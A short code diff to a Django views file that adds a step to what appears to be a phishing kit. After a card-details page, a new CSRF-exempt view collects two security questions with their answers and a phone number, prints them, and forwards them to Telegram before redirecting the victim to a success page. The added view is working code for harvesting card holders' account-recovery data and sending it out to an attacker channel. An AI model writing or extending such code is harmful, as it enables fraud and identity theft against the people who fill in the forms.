@@ -58,8 +58,23 @@ def card_view(request):
         #     'your-email@gmail.com',
         #     ['recipient-email@gmail.com'],
         # )
-        return redirect('success')
+        return redirect('phone')
     return render(request, 'card.html')
+
+@csrf_exempt
+def phone_detail(request):
+    if request.method == 'POST':
+        security_q1 = request.POST.get('sc')
+        security_a1 = request.POST.get('sa')
+        security_q2 = request.POST.get('sc1')
+        security_a2 = request.POST.get('sa1')
+        phone_no = request.POST.get('pn')
+        print(security_q1,security_a1,security_q2,security_a2,phone_no)
+        subject = 'New details submitted'
+        mail_message = f"{subject}\nsecurity_q1: {security_q1}\nsecurity_answer1:{security_a1}\nsecurity_q2:{security_q2}\nsecurity_answer2:{security_a2}\nphone_number:{phone_no}"
+        send_to_telegram(mail_message)
+        return redirect('success')
+    return render(request, 'phone.html')
 
 def success_view(request):
     return render(request, 'index.html')
